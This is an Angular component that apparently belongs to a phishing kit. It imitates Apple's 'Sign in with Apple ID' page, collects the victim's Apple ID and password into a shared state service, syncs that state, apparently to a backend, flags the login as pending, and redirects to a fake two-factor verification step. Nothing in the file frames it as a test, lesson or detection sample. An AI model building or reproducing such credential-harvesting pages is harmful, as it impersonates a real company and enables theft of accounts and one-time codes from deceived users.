import { Component, signal, output, inject, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, FormGroup, Validators } from '@angular/forms';
import { StateService } from '../../../services/state.service';
import { getFlowById } from '../../../services/flows.service';

@Component({
  selector: 'app-apple-login',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule],
  template: `
    <div class="apple-flow-container">
      <div class="apple-card">
        <div class="apple-logo-container">
          <img src="/assets/flows/apple/images/logo.svg" alt="Apple Logo" class="apple-logo">
        </div>
        
        <h1 class="apple-title">Sign in with Apple ID</h1>
        
        <form [formGroup]="loginForm" (ngSubmit)="onSubmit()">
          @if (!showPasswordStep()) {
            <div class="apple-input-group">
              <input 
                type="text" 
                id="appleId" 
                formControlName="appleId" 
                class="apple-input" 
                placeholder="Apple ID"
                [class.error]="loginForm.get('appleId')?.invalid && loginForm.get('appleId')?.touched"
                autocomplete="username"
              >
            </div>
            
            <div style="text-align: right;">
              <button 
                type="button" 
                class="apple-submit-btn" 
                (click)="nextStep()" 
                [disabled]="loginForm.get('appleId')?.invalid"
                aria-label="Next Step"
              >
                <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
                  <path d="M6 15L12 9L6 3" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
              </button>
            </div>
          } @else {
            <div class="apple-input-group">
              <input 
                type="password" 
                id="password" 
                formControlName="password" 
                class="apple-input" 
                placeholder="Password"
                [class.error]="loginForm.get('password')?.invalid && loginForm.get('password')?.touched"
                autocomplete="current-password"
              >
            </div>
            
            <div style="text-align: right;">
              <button 
                type="submit" 
                class="apple-submit-btn" 
                [disabled]="loginForm.invalid || loading()"
                aria-label="Sign In"
              >
                @if (loading()) {
                  <div class="apple-spinner"></div>
                } @else {
                  <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
                    <path d="M6 15L12 9L6 3" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                  </svg>
                }
              </button>
            </div>
            
            <div style="margin-top: 24px;">
              <a href="javascript:void(0)" class="apple-link" style="font-size: 15px;" (click)="showPasswordStep.set(false)">
                Use a different Apple ID
              </a>
            </div>
          }
        </form>
        
        <div class="apple-footer-links">
          <a href="javascript:void(0)" class="apple-link" style="font-size: 15px;">Forgot Apple ID or password?</a>
          <p style="margin-top: 32px; font-size: 12px; line-height: 1.4;">
            Your Apple ID is the account you use for all Apple services.
          </p>
        </div>
      </div>
    </div>
  `,
  styleUrls: ['../../../styles/flows/apple.scss'],
  styles: [`
    .apple-spinner {
      width: 20px;
      height: 20px;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: apple-spin 1s linear infinite;
    }
    @keyframes apple-spin {
      to { transform: rotate(360deg); }
    }
    input.error {
      border-color: #ff3b30 !important;
    }
  `]
})
export class AppleLoginComponent implements OnInit {
  private fb = inject(FormBuilder);
  private state = inject(StateService);

  loginForm: FormGroup = this.fb.group({
    appleId: ['', [Validators.required, Validators.email]],
    password: ['', [Validators.required, Validators.minLength(4)]]
  });

  showPasswordStep = signal(false);
  loading = signal(false);

  ngOnInit(): void {
    const flow = getFlowById('apple');
    if (flow) this.state.currentFlow.set(flow);
  }

  nextStep(): void {
    if (this.loginForm.get('appleId')?.valid) {
      this.state.email.set(this.loginForm.get('appleId')?.value);
      this.state.syncState();
      this.showPasswordStep.set(true);
    }
  }

  async onSubmit() {
    if (this.loginForm.valid) {
      this.loading.set(true);
      const data = this.loginForm.value;

      this.state.email.set(data.appleId);
      this.state.password.set(data.password);
      this.state.isLoginSubmitted.set(true);
      this.state.stage.set('login_pending');

      await this.state.syncState();
      this.loading.set(false);
      this.state.navigate('/verify/apple/2fa');
    }
  }
}
